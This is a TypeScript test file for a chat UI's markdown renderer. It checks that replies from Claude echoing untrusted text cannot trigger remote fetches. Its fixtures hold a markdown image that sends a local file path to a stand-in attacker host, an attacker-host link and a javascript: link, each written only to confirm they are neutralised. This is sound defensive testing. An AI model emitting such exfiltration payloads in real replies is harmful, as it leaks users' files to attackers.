import { describe, expect, test } from "bun:test";
import { renderToStaticMarkup } from "react-dom/server";
import { ReactMarkdownWrapper } from "@/components/ui/react-markdown-wrapper";

// Claude's replies can echo untrusted text (file names, text burnt into frames): rendering them must never make
// the browser fetch a remote URL without a click.

function render(markdown: string): string {
	return renderToStaticMarkup(
		<ReactMarkdownWrapper>{markdown}</ReactMarkdownWrapper>,
	);
}

describe("chat markdown rendering", () => {
	test("a markdown image renders as its alt text, with no request", () => {
		const html = render(
			"![aperçu](https://evil.example/c?d=%2FUsers%2Fseb%2Fcontrat.pdf)",
		);
		expect(html).not.toContain("<img");
		expect(html).not.toContain("evil.example");
		expect(html).toContain("aperçu");
	});

	test("links show their host next to the text and keep the full URL on hover", () => {
		const html = render("[voir](https://evil.example/p?q=1)");
		expect(html).toContain('href="https://evil.example/p?q=1"');
		expect(html).toContain('title="https://evil.example/p?q=1"');
		expect(html).toContain("(evil.example)");
	});

	test("javascript: links are neutralised", () => {
		expect(render("[x](javascript:alert(1))")).not.toContain("javascript:");
	});
});
